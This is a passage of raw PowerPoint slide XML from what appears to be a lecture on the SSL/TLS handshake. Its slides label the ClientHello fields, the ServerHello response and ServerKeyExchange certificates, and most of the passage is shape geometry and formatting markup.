              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="615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ProtocolVersion</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-18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client_version;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093789" name="object 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="536040" y="3032063"/>
            <a:ext cx="4595819" cy="155563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9080" rIns="0" bIns="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="12600">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="15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Random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random;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SessionID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-13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session_id;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CipherSuite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-14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cipher_suites;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3027219" name="object 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="485280" y="4478100"/>
            <a:ext cx="727488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06560" rIns="0" bIns="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="345960">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="839"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pP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CompressionMethod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compression_methods;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4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}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ClientHello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33541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ClientHello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(RFC)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6863984" name="object 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5927760" y="1600200"/>
            <a:ext cx="2784600" cy="728640"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="textAreaLeft" fmla="*/ 0 w 2784600"/>
              <a:gd name="textAreaRight" fmla="*/ 2784960 w 2784600"/>
              <a:gd name="textAreaTop" fmla="*/ 0 h 728640"/>
              <a:gd name="textAreaBottom" fmla="*/ 729000 h 728640"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
            <a:pathLst>
              <a:path w="2785109" h="728980" fill="norm" stroke="1" extrusionOk="0">
                <a:moveTo>
                  <a:pt x="15892" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="477325" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1169474" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2784491" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2784491" y="311149"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2784491" y="444500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2784491" y="533399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1169474" y="533399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="728655"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="477325" y="533399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15892" y="533399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15892" y="444500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15892" y="311149"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15892" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="285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546240" name="object 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6084000" y="1633320"/>
            <a:ext cx="2437560" cy="63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342360" indent="-330120">
              <a:lnSpc>
                <a:spcPts val="1599"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="218"/>
              </a:spcBef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Highest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protocol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supported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client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224385" name="object 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4768785" y="2681069"/>
            <a:ext cx="3076920" cy="576360"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="textAreaLeft" fmla="*/ 0 w 3076920"/>
              <a:gd name="textAreaRight" fmla="*/ 3077280 w 3076920"/>
              <a:gd name="textAreaTop" fmla="*/ 0 h 576360"/>
              <a:gd name="textAreaBottom" fmla="*/ 576720 h 576360"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
            <a:pathLst>
              <a:path w="3077209" h="576579" fill="norm" stroke="1" extrusionOk="0">
                <a:moveTo>
                  <a:pt x="308006" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="769439" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1461589" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3076606" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3076606" y="311150"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3076606" y="444499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3076606" y="533399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1461589" y="533399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="769439" y="533399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="308006" y="533399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="308006" y="444499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="576269"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="308006" y="311150"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="308006" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="285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1124" name="object 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5222879" y="2681069"/>
            <a:ext cx="2537280" cy="433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391680" indent="-379800">
              <a:lnSpc>
                <a:spcPts val="1599"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="218"/>
              </a:spcBef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Session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id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(if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wants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to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resume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an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old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session)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161499" name="object 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5038920" y="3429000"/>
            <a:ext cx="3342960" cy="761760"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="textAreaLeft" fmla="*/ 0 w 3342960"/>
              <a:gd name="textAreaRight" fmla="*/ 3343320 w 334296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3343275" h="762000" fill="norm" stroke="1" extrusionOk="0">
                <a:moveTo>
                  <a:pt x="574623" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="1036056" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1728205" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3343222" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3343222" y="444499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3343222" y="634999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3343222" y="761999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1728205" y="761999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1036056" y="761999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="574623" y="761999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="574623" y="634999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="525459"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="574623" y="444499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="574623" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="285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809625" name="object 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5691960" y="3462120"/>
            <a:ext cx="2480760" cy="852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98000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="130"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pP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Set</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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1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cryptographic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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algorithms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supported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1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(e.g.,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1400" b="0" strike="noStrike" spc="-7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or</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" strike="noStrike" spc="-7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Diffie-Hellman)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305161" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="2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AFB47994-4A6B-4228-B1C7-39DECBD7CA83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76105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ServerHello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389075323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125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88612656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4551781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129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48833217" name="object 10"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="3592440" y="2895480"/>
            <a:ext cx="3265560" cy="151920"/>
            <a:chOff x="3592440" y="2895480"/>
            <a:chExt cx="3265560" cy="151920"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="132" name="object 11"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3677040" y="297180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object 12"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3592440" y="28954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13039743" name="object 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2001240" y="1834920"/>
            <a:ext cx="20530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C,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suites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c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326944" name="object 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5793840" y="2623680"/>
            <a:ext cx="1046879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ServerHello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863010" name="object 15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137" name="object 16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object 17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80320748" name="object 18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3907935" name="object 19"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="2095560" y="2872440"/>
            <a:ext cx="4381200" cy="2537640"/>
            <a:chOff x="2095560" y="2872440"/>
            <a:chExt cx="4381200" cy="2537640"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="141" name="object 20"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2095560" y="2872440"/>
              <a:ext cx="4381200" cy="2537640"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 4381200"/>
                <a:gd name="textAreaRight" fmla="*/ 4381560 w 4381200"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 2537640"/>
                <a:gd name="textAreaBottom" fmla="*/ 2538000 h 2537640"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="4381500" h="2538095" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="3946591" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="2555873" y="480443"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="480443"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="2537843"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4381498" y="2537843"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4381498" y="480443"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3651248" y="480443"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="394659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object 21"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2095560" y="2872440"/>
              <a:ext cx="4381200" cy="2537640"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 4381200"/>
                <a:gd name="textAreaRight" fmla="*/ 4381560 w 4381200"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 2537640"/>
                <a:gd name="textAreaBottom" fmla="*/ 2538000 h 2537640"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="4381500" h="2538095" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="480443"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="2555874" y="480443"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3946591" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3651249" y="480443"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4381498" y="480443"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4381498" y="823343"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4381498" y="1337693"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4381498" y="2537843"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3651249" y="2537843"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2555874" y="2537843"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="2537843"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="1337693"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="823343"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="480443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3032685" name="object 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2174400" y="3338640"/>
            <a:ext cx="4044600" cy="2635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9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71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responds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(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" u="sng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1800" b="0" u="sng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u="sng" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>plaintext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)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with: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200" indent="-175320">
              <a:lnSpc>
                <a:spcPts val="2599"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="91"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="008080"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char=""/>
              <a:tabLst>
                <a:tab pos="22680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Highest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protocol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supported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by 	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both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1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server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200" indent="-175320">
              <a:lnSpc>
                <a:spcPts val="2599"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="008080"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char=""/>
              <a:tabLst>
                <a:tab pos="22680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Strongest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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cryptographic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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suite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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selected 	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those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offered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client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87920" indent="-175320">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="281"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="008080"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char=""/>
              <a:tabLst>
                <a:tab pos="18792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Fresh,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random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number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982069" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="2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C064119-E4EB-4FAE-8101-230CFF4A293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20750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ServerKeyExchange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27011118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147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25897699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52030484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151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9888592" name="object 10"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="2209680" y="3200400"/>
            <a:ext cx="4648320" cy="2133360"/>
            <a:chOff x="2209680" y="3200400"/>
            <a:chExt cx="4648320" cy="2133360"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="154" name="object 11"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3677040" y="327672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object 12"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3592440" y="320040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object 13"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2209680" y="3201840"/>
              <a:ext cx="4571640" cy="21319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2131920"/>
                <a:gd name="textAreaBottom" fmla="*/ 2132280 h 2131920"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="4572000" h="2132329" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="3565107" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="2666998" y="608045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="608045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="2132045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4571998" y="2132045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4571998" y="608045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3809998" y="608045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="356510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object 14"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2209680" y="3201840"/>
              <a:ext cx="4571640" cy="21319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2131920"/>
                <a:gd name="textAreaBottom" fmla="*/ 2132280 h 2131920"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="4572000" h="2132329" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="608045"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="2666999" y="608045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3565107" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3809999" y="608045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4571998" y="608045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4571998" y="862045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4571998" y="1243045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4571998" y="2132045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3809999" y="2132045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2666999" y="2132045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="2132045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="1243045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="862045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="608045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68722471" name="object 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1988640" y="1834920"/>
            <a:ext cx="4937400" cy="1674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07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C,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suites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c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50760">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc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65"/>
              </a:spcBef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132000">
              <a:lnSpc>
                <a:spcPct val="119000"/>
              </a:lnSpc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ServerKeyExchange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2938479" name="object 16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160" name="object 17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" name="object 18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1726923" name="object 19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536889" name="object 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2288520" y="3782160"/>
            <a:ext cx="4239360" cy="2214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20000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="99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sends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his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public-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certificate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containing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either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his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RSA,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or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900"/>
              </a:lnSpc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his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Diffie-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Hellman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key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(depending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chosen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crypto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suite)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750461" name="object 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4038480" y="3657600"/>
            <a:ext cx="2819160" cy="685440"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="textAreaLeft" fmla="*/ 0 w 2819160"/>
              <a:gd name="textAreaRight" fmla="*/ 2819520 w 2819160"/>
              <a:gd name="textAreaTop" fmla="*/ 0 h 685440"/>
              <a:gd name="textAreaBottom" fmla="*/ 685800 h 685440"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
            <a:pathLst>
              <a:path w="2819400" h="685800" fill="norm" stroke="1" extrusionOk="0">
                <a:moveTo>
                  <a:pt x="0" y="342899"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="16242" y="290679"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="44381" y="257203"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="85540" y="224999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="139011" y="194238"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="204086" y="165093"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="240754" y="151181"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="280057" y="137737"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="321906" y="124783"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="366214" y="112341"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="412891" y="100433"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="461849" y="89079"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="512999" y="78301"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="566253" y="68122"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="621523" y="58561"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="678719" y="49642"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="737753" y="41386"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="798536" y="33813"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="860980" y="26946"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="924997" y="20807"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="990498" y="15416"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1057393" y="10795"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1125595" y="6966"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1195016" y="3950"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1265566" y="1770"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1337156" y="446"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1409699" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1482242" y="446"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1553833" y="1770"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1624383" y="3950"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1693803" y="6966"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1762005" y="10795"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1828901" y="15416"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1894401" y="20807"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1958418" y="26946"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2020862" y="33813"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2081646" y="41386"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2140680" y="49642"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2197876" y="58561"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2253145" y="68122"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2306399" y="78301"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2357549" y="89079"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2406507" y="100433"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2453184" y="112341"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2497492" y="124783"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2539341" y="137737"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2578644" y="151181"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2615312" y="165093"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2680387" y="194238"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2733859" y="224999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2775018" y="257203"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2803156" y="290679"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2819399" y="342899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2817564" y="360545"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2790759" y="412006"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2756021" y="444867"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2708618" y="476372"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2649256" y="506346"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2578644" y="534618"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2539341" y="548062"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2497492" y="561016"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2453184" y="573458"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2406507" y="585366"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2357549" y="596720"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2306399" y="607498"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2253145" y="617677"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2197876" y="627237"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2140680" y="636157"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2081646" y="644413"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2020862" y="651986"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1958418" y="658853"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1894401" y="664992"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1828901" y="670383"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1762005" y="675004"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1693803" y="678833"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1624383" y="681848"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1553833" y="684029"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1482242" y="685353"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1409699" y="685799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1337156" y="685353"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1265566" y="684029"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1195016" y="681848"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1125595" y="678833"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1057393" y="675004"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="990498" y="670383"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="924997" y="664992"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="860980" y="658853"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="798536" y="651986"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="737753" y="644413"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="678719" y="636157"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="621523" y="627237"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="566253" y="617677"/>
                </a:lnTo>
                <a:lnTo>
